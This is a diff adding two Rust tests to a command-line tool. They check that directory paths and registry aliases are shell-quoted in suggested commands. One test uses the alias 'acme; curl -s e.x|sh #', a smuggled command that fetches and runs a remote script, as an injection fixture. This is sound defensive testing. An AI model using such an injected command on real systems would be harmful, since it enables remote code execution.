@@ -107,3 +107,65 @@ fn check_prints_no_control_character_a_lock_holds() {
     );
     assert!(shown.contains("E033"), "{shown}");
 }
+
+#[test]
+#[ignore = "flipped by T6"]
+fn the_next_steps_name_a_directory_with_a_space_as_one_shell_word() {
+    let dir = TestProject::new().without_config();
+    let parent = dir.root().join("my ext");
+    std::fs::create_dir(&parent).unwrap();
+
+    let run = Cli::on(&dir)
+        .bare(&[
+            "extension",
+            "init",
+            "--name",
+            "@acme/demo",
+            "--dir",
+            parent.to_str().unwrap(),
+        ])
+        .exits(0);
+
+    let at = format!("'{}/demo'", parent.display());
+    assert!(
+        run.stdout
+            .contains(&format!("  specforge extension build --dir {at}\n")),
+        "{}",
+        run.stdout
+    );
+    assert!(
+        run.stdout
+            .contains(&format!("  specforge extension validate --dir {at}\n")),
+        "{}",
+        run.stdout
+    );
+}
+
+#[specforge_test(
+    behavior = "publish_to_registry",
+    verify = "a publish refused for want of a credential names the login command with the registry alias as one shell word"
+)]
+#[ignore = "flipped by T7"]
+fn a_registry_alias_is_named_as_one_shell_word_in_the_login_remedy() {
+    let project = TestProject::new()
+        .config(|c| {
+            c["name"] = "p".into();
+            c["registries"] = json!([
+                { "alias": "acme; curl -s e.x|sh #", "url": "http://127.0.0.1:9", "default_registry": true }
+            ]);
+            c.as_object_mut().unwrap().remove("extensions");
+        })
+        .file("greet.wasm", greet_wasm());
+    let wasm = project.root().join("greet.wasm");
+
+    let run = Cli::on(&project).run(&["publish", wasm.to_str().unwrap(), "--format", "json"]);
+
+    assert_eq!(run.code, 1, "{}{}", run.stdout, run.stderr);
+    let json = run.json();
+    assert_eq!(json["code"], "R001", "{json}");
+    assert_eq!(
+        json["suggestion"],
+        "log in with `specforge login --registry 'acme; curl -s e.x|sh #' --token <TOKEN>`, or set SPECFORGE_REGISTRY_TOKEN",
+        "{json}"
+    );
+}
